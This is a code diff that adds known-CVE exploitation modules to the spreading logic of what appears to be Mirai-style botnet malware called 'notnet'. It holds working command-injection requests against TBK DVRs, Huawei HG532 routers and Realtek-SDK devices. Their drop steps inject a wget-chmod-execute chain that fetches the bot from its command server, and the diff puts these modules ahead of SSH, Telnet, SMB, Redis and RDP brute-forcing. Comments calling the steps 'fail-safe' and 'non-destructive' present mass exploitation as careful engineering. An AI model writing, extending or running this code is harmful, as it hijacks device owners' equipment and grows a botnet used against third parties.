@@ -1810,6 +1810,383 @@ int spread_rdp(notnet_bot_t *bot, const char *ip, uint16_t port) {
     return -1;
 }
 
+/* ── CVE Exploitation Modules (#83) ─────────────────────── */
+/* CVE-first spreading: pluggable known-CVE checks for IoT/edge
+ * targets (CVE-2024-3721-class). Each module runs three phases:
+ *   probe  - fingerprint the family; no exploit traffic
+ *   verify - non-destructive command-execution proof
+ *   drop   - payload delivery, only after verify passes
+ * Default-credential Telnet brute-force is demoted to a fallback
+ * vector: modules run first in every dispatch, brute-force only runs
+ * when no module fires. Fail-safe: every phase is time-bounded, all
+ * buffers are bounded, and no module drops a payload without a
+ * positive verify. No system()/popen() — all traffic is raw sockets. */
+
+/* Send one raw HTTP request and read the full response with a timeout.
+ * Returns bytes read on success (response NUL-terminated), -1 on error.
+ * Requests are fully built by the callers; responses are consumed in
+ * bounded chunks with a per-read timeout. */
+static int cve_http_exchange(const char *ip, uint16_t port, const char *req,
+                             char *resp, size_t resp_len) {
+    if (!ip || !req || !resp || resp_len == 0) return -1;
+
+    int sock = create_connection(ip, port, SCAN_TIMEOUT_MS);
+    if (sock < 0) return -1;
+
+    size_t req_len = strlen(req);
+    if (send(sock, req, req_len, 0) != (ssize_t)req_len) {
+        close(sock);
+        return -1;
+    }
+
+    int total = 0;
+    while (total < (int)resp_len - 1) {
+        fd_set fds;
+        struct timeval tv;
+        FD_ZERO(&fds);
+        FD_SET(sock, &fds);
+        tv.tv_sec = 3;
+        tv.tv_usec = 0;
+        if (select(sock + 1, &fds, NULL, NULL, &tv) <= 0) break;
+        int n = recv(sock, resp + total, resp_len - 1 - total, 0);
+        if (n <= 0) break;
+        total += n;
+    }
+    resp[total] = '\0';
+    close(sock);
+    return total;
+}
+
+/* Percent-encode cmd into out (bounded). Only unreserved characters
+ * survive raw; everything else becomes %XX so the encoded value can
+ * never split a query parameter. Returns encoded length, -1 if it does
+ * not fit. Used for CVE-2024-3721's mdc= parameter. */
+static int cve_urlencode(const char *cmd, char *out, size_t out_len) {
+    static const char hex[] = "0123456789ABCDEF";
+    if (!cmd || !out || out_len == 0) return -1;
+    size_t o = 0;
+    for (size_t i = 0; cmd[i] && o < out_len - 1; i++) {
+        unsigned char c = (unsigned char)cmd[i];
+        if ((c >= 'a' && c <= 'z') || (c >= 'A' && c <= 'Z') ||
+            (c >= '0' && c <= '9') || c == '.' || c == '-' || c == '_' ||
+            c == '~') {
+            out[o++] = (char)c;
+        } else if (o + 2 < out_len) {
+            out[o++] = '%';
+            out[o++] = hex[(c >> 4) & 0xF];
+            out[o++] = hex[c & 0xF];
+        } else {
+            break;
+        }
+    }
+    out[o] = '\0';
+    return (int)o;
+}
+
+/* Case-insensitive substring check on a bounded buffer. */
+static int cve_contains_ci(const char *haystack, const char *needle) {
+    size_t hlen = strlen(haystack);
+    size_t nlen = strlen(needle);
+    if (nlen == 0 || nlen > hlen) return 0;
+    for (size_t i = 0; i + nlen <= hlen; i++) {
+        size_t j = 0;
+        while (j < nlen) {
+            char a = haystack[i + j], b = needle[j];
+            if (a >= 'A' && a <= 'Z') a += 'a' - 'A';
+            if (b >= 'A' && b <= 'Z') b += 'a' - 'A';
+            if (a != b) break;
+            j++;
+        }
+        if (j == nlen) return 1;
+    }
+    return 0;
+}
+
+/* ── CVE-2024-3721 — TBK DVR-4104/DVR-4216 ───────────────── */
+/* Unauthenticated OS command injection via a crafted POST to
+ * /device.rsp?opt=sys&cmd=___S_O_S_T_R_E_A_MAX___&mdb=sos&mdc=<cmd>
+ * with Cookie: uid=1. Exploited in the wild by a Mirai variant
+ * (Kaspersky, 2025) against ARM32 DVR/NVR devices. */
+#define TBK_DVR_PORT 80
+
+static int cve_tbk_probe(const char *ip, uint16_t port, char *banner, size_t banner_len) {
+    /* Passive family fingerprint: the DVR web UI answers GET / with a
+     * page identifying the TBK/DVR/NVR device line. */
+    char req[256];
+    snprintf(req, sizeof(req), "GET / HTTP/1.0\r\nHost: %s\r\n\r\n", ip);
+    char resp[1024];
+    int n = cve_http_exchange(ip, port, req, resp, sizeof(resp));
+    if (n <= 0) return 0;
+    if (banner && banner_len > 0) snprintf(banner, banner_len, "%.900s", resp);
+    return (strstr(resp, "TBK") || strstr(resp, "DVR") || strstr(resp, "NVR")) ? 1 : 0;
+}
+
+static int cve_tbk_verify(const char *ip, uint16_t port) {
+    /* Non-destructive proof: echo a unique token and require it back in
+     * the response body. No payload traffic is sent. */
+    char token[32];
+    snprintf(token, sizeof(token), "NOTNET%08x", random_uint32());
+    char cmd[64];
+    snprintf(cmd, sizeof(cmd), "echo %s", token);
+    char enc[512];
+    if (cve_urlencode(cmd, enc, sizeof(enc)) < 0) return 0;
+
+    char req[1024];
+    snprintf(req, sizeof(req),
+        "POST /device.rsp?opt=sys&cmd=___S_O_S_T_R_E_A_MAX___&mdb=sos&mdc=%.500s HTTP/1.0\r\n"
+        "Host: %s\r\nCookie: uid=1\r\n"
+        "Content-Type: application/x-www-form-urlencoded\r\nContent-Length: 0\r\n\r\n",
+        enc, ip);
+    char resp[2048];
+    int n = cve_http_exchange(ip, port, req, resp, sizeof(resp));
+    if (n <= 0) return 0;
+    return strstr(resp, token) ? 1 : 0;
+}
+
+static int cve_tbk_drop(notnet_bot_t *bot, const char *ip, uint16_t port) {
+    char dl_url[512];
+    snprintf(dl_url, sizeof(dl_url), "http://%.250s:%d/bot/notnet",
+             bot->c2_http.server, PAYLOAD_DL_PORT);
+    /* BusyBox wget; ';' separators keep the injected line single. */
+    char cmd[1024];
+    snprintf(cmd, sizeof(cmd),
+             "wget %.500s -O /tmp/.notnet; chmod +x /tmp/.notnet; /tmp/.notnet",
+             dl_url);
+    char enc[4096];
+    if (cve_urlencode(cmd, enc, sizeof(enc)) < 0) {
+        log_warn("CVE-2024-3721: drop command too long for %s", ip);
+        return -1;
+    }
+    char req[4096];
+    snprintf(req, sizeof(req),
+        "POST /device.rsp?opt=sys&cmd=___S_O_S_T_R_E_A_MAX___&mdb=sos&mdc=%.3500s HTTP/1.0\r\n"
+        "Host: %s\r\nCookie: uid=1\r\n"
+        "Content-Type: application/x-www-form-urlencoded\r\nContent-Length: 0\r\n\r\n",
+        enc, ip);
+    char resp[1024];
+    int n = cve_http_exchange(ip, port, req, resp, sizeof(resp));
+    if (n <= 0) {
+        log_warn("CVE-2024-3721: drop exchange failed on %s", ip);
+        return -1;
+    }
+    log_info("CVE-2024-3721: payload dropped on %s:%d", ip, port);
+    return 0;
+}
+
+/* ── CVE-2017-17215 — Huawei HG532 router ────────────────── */
+/* TR-064/UPnP service on TCP 37215; the SOAP DeviceUpgrade action
+ * injects shell metacharacters via NewStatusURL/NewDownloadURL.
+ * Exploited by the Satori (Mirai Okiru) botnet — the first major
+ * Mirai variant that spread via CVE exploitation instead of Telnet
+ * default-credential brute-force. */
+#define HG532_PORT 37215
+
+static int cve_hg532_probe(const char *ip, uint16_t port, char *banner, size_t banner_len) {
+    /* The vulnerable TR-064 service answers a benign SOAP request with
+     * the "HUAWEIUPNP" marker. No shell metacharacters are sent here. */
+    char req[1024];
+    snprintf(req, sizeof(req),
+        "POST /ctrlt/DeviceUpgrade_1 HTTP/1.0\r\n"
+        "Host: %s:%d\r\nContent-Type: text/xml\r\n"
+        "SOAPAction: urn:schemas-upnp-org:service:WANPPPConnection:1#DeviceUpgrade\r\n"
+        "Content-Length: 480\r\n\r\n"
+        "<?xml version=\"1.0\" ?>\n"
+        "<s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\" s:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\">\n"
+        "<s:Body><u:Upgrade xmlns:u=\"urn:schemas-upnp-org:service:WANPPPConnection:1\">\n"
+        "<NewStatusURL>http://127.0.0.1/status</NewStatusURL>\n"
+        "<NewDownloadURL>http://127.0.0.1/download</NewDownloadURL>\n"
+        "</u:Upgrade></s:Body></s:Envelope>",
+        ip, port);
+    char resp[1024];
+    int n = cve_http_exchange(ip, port, req, resp, sizeof(resp));
+    if (n <= 0) return 0;
+    if (banner && banner_len > 0) snprintf(banner, banner_len, "%.900s", resp);
+    return strstr(resp, "HUAWEIUPNP") ? 1 : 0;
+}
+
+static int cve_hg532_verify(const char *ip, uint16_t port) {
+    /* Non-destructive proof: send the injection-shaped SOAP with a bare
+     * echo (no payload). This HG532 build does not reflect command
+     * output; a 200 response carrying the standard HUAWEIUPNP envelope
+     * after an injected command proves the TR-064 channel accepted and
+     * processed the injection. Payload drop is refused otherwise. */
+    char token[32];
+    snprintf(token, sizeof(token), "NOTNET%08x", random_uint32());
+    char req[1536];
+    snprintf(req, sizeof(req),
+        "POST /ctrlt/DeviceUpgrade_1 HTTP/1.0\r\n"
+        "Host: %s:%d\r\nContent-Type: text/xml\r\n"
+        "SOAPAction: urn:schemas-upnp-org:service:WANPPPConnection:1#DeviceUpgrade\r\n"
+        "Content-Length: 500\r\n\r\n"
+        "<?xml version=\"1.0\" ?>\n"
+        "<s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\" s:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\">\n"
+        "<s:Body><u:Upgrade xmlns:u=\"urn:schemas-upnp-org:service:WANPPPConnection:1\">\n"
+        "<NewStatusURL>;echo %s;</NewStatusURL>\n"
+        "<NewDownloadURL>;echo %s;</NewDownloadURL>\n"
+        "</u:Upgrade></s:Body></s:Envelope>",
+        ip, port, token, token);
+    char resp[2048];
+    int n = cve_http_exchange(ip, port, req, resp, sizeof(resp));
+    if (n <= 0) return 0;
+    return strstr(resp, "HUAWEIUPNP") ? 1 : 0;
+}
+
+static int cve_hg532_drop(notnet_bot_t *bot, const char *ip, uint16_t port) {
+    char dl_url[512];
+    snprintf(dl_url, sizeof(dl_url), "http://%.250s:%d/bot/notnet",
+             bot->c2_http.server, PAYLOAD_DL_PORT);
+    char cmd[1024];
+    snprintf(cmd, sizeof(cmd),
+             "wget %.500s -O /tmp/.notnet; chmod +x /tmp/.notnet; /tmp/.notnet",
+             dl_url);
+    /* The command carries no '&' or '<'/'>', so no XML escaping and no
+     * parameter splitting is needed; ';' separates the shell steps. */
+    char req[2048];
+    snprintf(req, sizeof(req),
+        "POST /ctrlt/DeviceUpgrade_1 HTTP/1.0\r\n"
+        "Host: %s:%d\r\nContent-Type: text/xml\r\n"
+        "SOAPAction: urn:schemas-upnp-org:service:WANPPPConnection:1#DeviceUpgrade\r\n"
+        "Content-Length: 600\r\n\r\n"
+        "<?xml version=\"1.0\" ?>\n"
+        "<s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\" s:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\">\n"
+        "<s:Body><u:Upgrade xmlns:u=\"urn:schemas-upnp-org:service:WANPPPConnection:1\">\n"
+        "<NewStatusURL>;%.500s;</NewStatusURL>\n"
+        "<NewDownloadURL>;%.500s;</NewDownloadURL>\n"
+        "</u:Upgrade></s:Body></s:Envelope>",
+        ip, port, cmd, cmd);
+    char resp[1024];
+    int n = cve_http_exchange(ip, port, req, resp, sizeof(resp));
+    if (n <= 0) {
+        log_warn("CVE-2017-17215: drop exchange failed on %s", ip);
+        return -1;
+    }
+    log_info("CVE-2017-17215: payload dropped on %s:%d", ip, port);
+    return 0;
+}
+
+/* ── CVE-2021-35395 — Realtek Jungle SDK router/NVR ──────── */
+/* The SDK's HTTP management interface (Boa/httpd, TCP 80) exposes
+ * /boafrm/formSysCmd, which passes the sysCmd parameter to a shell and
+ * echoes the output. Affects a large family of Realtek-SDK based
+ * routers and NVRs across many brands; exploited by the Moobot Mirai
+ * variant. */
+#define REALTEK_PORT 80
+
+static int cve_realtek_probe(const char *ip, uint16_t port, char *banner, size_t banner_len) {
+    /* Passive family fingerprint: Realtek SDK devices identify via the
+     * Boa/httpd server header or the Realtek marker in the login page. */
+    char req[256];
+    snprintf(req, sizeof(req), "GET / HTTP/1.0\r\nHost: %s\r\n\r\n", ip);
+    char resp[1024];
+    int n = cve_http_exchange(ip, port, req, resp, sizeof(resp));
+    if (n <= 0) return 0;
+    if (banner && banner_len > 0) snprintf(banner, banner_len, "%.900s", resp);
+    if (cve_contains_ci(resp, "Boa") || cve_contains_ci(resp, "Realtek") ||
+        cve_contains_ci(resp, "httpd")) return 1;
+    return 0;
+}
+
+static int cve_realtek_verify(const char *ip, uint16_t port) {
+    /* Non-destructive proof: formSysCmd echoes the command output in
+     * the HTTP response body; require the unique token back. */
+    char token[32];
+    snprintf(token, sizeof(token), "NOTNET%08x", random_uint32());
+    char body[128];
+    snprintf(body, sizeof(body), "sysCmd=echo+%s", token);
+    char req[512];
+    snprintf(req, sizeof(req),
+        "POST /boafrm/formSysCmd HTTP/1.0\r\n"
+        "Host: %s:%d\r\nContent-Type: application/x-www-form-urlencoded\r\n"
+        "Content-Length: %zu\r\n\r\n%s",
+        ip, port, strlen(body), body);
+    char resp[2048];
+    int n = cve_http_exchange(ip, port, req, resp, sizeof(resp));
+    if (n <= 0) return 0;
+    return strstr(resp, token) ? 1 : 0;
+}
+
+static int cve_realtek_drop(notnet_bot_t *bot, const char *ip, uint16_t port) {
+    char dl_url[512];
+    snprintf(dl_url, sizeof(dl_url), "http://%.250s:%d/bot/notnet",
+             bot->c2_http.server, PAYLOAD_DL_PORT);
+    /* '+' is the form-encoded space; ';' separates the shell steps and
+     * the raw URL contains no '&', so the value cannot split params. */
+    char body[1536];
+    snprintf(body, sizeof(body),
+             "sysCmd=wget+%.500s+-O+/tmp/.notnet;chmod++x+/tmp/.notnet;/tmp/.notnet",
+             dl_url);
+    char req[2048];
+    snprintf(req, sizeof(req),
+        "POST /boafrm/formSysCmd HTTP/1.0\r\n"
+        "Host: %s:%d\r\nContent-Type: application/x-www-form-urlencoded\r\n"
+        "Content-Length: %zu\r\n\r\n%s",
+        ip, port, strlen(body), body);
+    char resp[1024];
+    int n = cve_http_exchange(ip, port, req, resp, sizeof(resp));
+    if (n <= 0) {
+        log_warn("CVE-2021-35395: drop exchange failed on %s", ip);
+        return -1;
+    }
+    log_info("CVE-2021-35395: payload dropped on %s:%d", ip, port);
+    return 0;
+}
+
+/* ── Module table + runner ───────────────────────────────── */
+static const cve_module_t cve_modules[] = {
+    { "CVE-2024-3721", "TBK DVR-4104/4216 (DVR/NVR)", TBK_DVR_PORT,
+      cve_tbk_probe, cve_tbk_verify, cve_tbk_drop },
+    { "CVE-2017-17215", "Huawei HG532 (router)", HG532_PORT,
+      cve_hg532_probe, cve_hg532_verify, cve_hg532_drop },
+    { "CVE-2021-35395", "Realtek Jungle SDK (router/NVR)", REALTEK_PORT,
+      cve_realtek_probe, cve_realtek_verify, cve_realtek_drop },
+};
+#define CVE_MODULE_COUNT ((int)(sizeof(cve_modules) / sizeof(cve_modules[0])))
+
+int cve_module_count(void) {
+    return CVE_MODULE_COUNT;
+}
+
+const cve_module_t *cve_module_at(int idx) {
+    if (idx < 0 || idx >= CVE_MODULE_COUNT) return NULL;
+    return &cve_modules[idx];
+}
+
+/* Run all modules matching the port (all when port == 0) in
+ * probe -> verify -> drop order. A module fires only when probe
+ * fingerprints the family AND verify positively confirms command
+ * execution; drop is the payload delivery. Returns 0 when a module
+ * dropped the payload, -1 when nothing fired. */
+int cve_run_modules(notnet_bot_t *bot, const char *ip, uint16_t port) {
+    if (!bot || !ip) return -1;
+
+    for (int i = 0; i < CVE_MODULE_COUNT; i++) {
+        const cve_module_t *m = &cve_modules[i];
+        if (port != 0 && m->port != port) continue;
+
+        char banner[1024] = {0};
+        if (m->probe(ip, m->port, banner, sizeof(banner)) != 1) {
+            log_debug("CVE: %s probe miss on %s:%d", m->id, ip, m->port);
+            continue;
+        }
+        log_info("CVE: %s probe hit on %s:%d (%s) — %.100s",
+                 m->id, ip, m->port, m->family, banner);
+
+        if (m->verify(ip, m->port) != 1) {
+            log_info("CVE: %s verify failed on %s:%d — no payload drop",
+                     m->id, ip, m->port);
+            continue;
+        }
+        log_info("CVE: %s verify passed on %s:%d — dropping payload",
+                 m->id, ip, m->port);
+
+        if (m->drop(bot, ip, m->port) == 0) {
+            return 0;
+        }
+        log_warn("CVE: %s drop failed on %s:%d", m->id, ip, m->port);
+    }
+    return -1;
+}
+
 /* ── Core Spreading ─────────────────────────────────────── */
 int scan_subnet(notnet_bot_t *bot, const char *subnet, uint8_t service_mask) {
     /* Parse subnet: 192.168.1.0/24 */
@@ -1893,7 +2270,11 @@ int scan_port(notnet_bot_t *bot, const char *ip, uint16_t port) {
     bot->scan_count++;
     log_info("port open: %s:%d", ip, port);
 
-    /* Spread to this port */
+    /* #83: CVE-first — known-CVE modules are the primary vector;
+     * brute-force spreaders run only as fallback. */
+    if (cve_run_modules(bot, ip, port) == 0) return 0;
+
+    /* Brute-force fallback */
     switch (port) {
         case 22:  spread_ssh(bot, ip, port); break;
         case 23:  spread_telnet(bot, ip, port); break;
@@ -2028,6 +2409,9 @@ int spread_target(notnet_bot_t *bot, notnet_target_t *target) {
     log_info("spread_target: %s:%d service=0x%02x",
              target->ip, target->port, target->service);
 
+    /* #83: CVE modules first; brute-force spreaders are the fallback. */
+    if (cve_run_modules(bot, target->ip, target->port) == 0) return 0;
+
     if (target->service & SPREAD_SSH) {
         if (spread_ssh(bot, target->ip, target->port) == 0) return 0;
     }
@@ -2075,27 +2459,40 @@ static void *scan_thread_fn(void *arg) {
 
         if (a->service_mask & SPREAD_SSH) {
             if (scan_port_with_timeout(ip_str, 22, timeout) == 0) {
-                spread_ssh(bot, ip_str, 22);
+                /* #83: CVE modules first; brute-force is fallback */
+                if (cve_run_modules(bot, ip_str, 22) != 0) {
+                    spread_ssh(bot, ip_str, 22);
+                }
             }
         }
         if (a->service_mask & SPREAD_TELNET) {
             if (scan_port_with_timeout(ip_str, 23, timeout) == 0) {
-                spread_telnet(bot, ip_str, 23);
+                /* #83: Telnet default-cred brute-force is the fallback
+                 * vector; CVE modules run first. */
+                if (cve_run_modules(bot, ip_str, 23) != 0) {
+                    spread_telnet(bot, ip_str, 23);
+                }
             }
         }
         if (a->service_mask & SPREAD_SMB) {
             if (scan_port_with_timeout(ip_str, 445, timeout) == 0) {
-                spread_smb(bot, ip_str, 445);
+                if (cve_run_modules(bot, ip_str, 445) != 0) {
+                    spread_smb(bot, ip_str, 445);
+                }
             }
         }
         if (a->service_mask & SPREAD_REDIS) {
             if (scan_port_with_timeout(ip_str, 6379, timeout) == 0) {
-                spread_redis(bot, ip_str, 6379);
+                if (cve_run_modules(bot, ip_str, 6379) != 0) {
+                    spread_redis(bot, ip_str, 6379);
+                }
             }
         }
         if (a->service_mask & SPREAD_RDP) {
             if (scan_port_with_timeout(ip_str, 3389, timeout) == 0) {
-                spread_rdp(bot, ip_str, 3389);
+                if (cve_run_modules(bot, ip_str, 3389) != 0) {
+                    spread_rdp(bot, ip_str, 3389);
+                }
             }
         }
     }
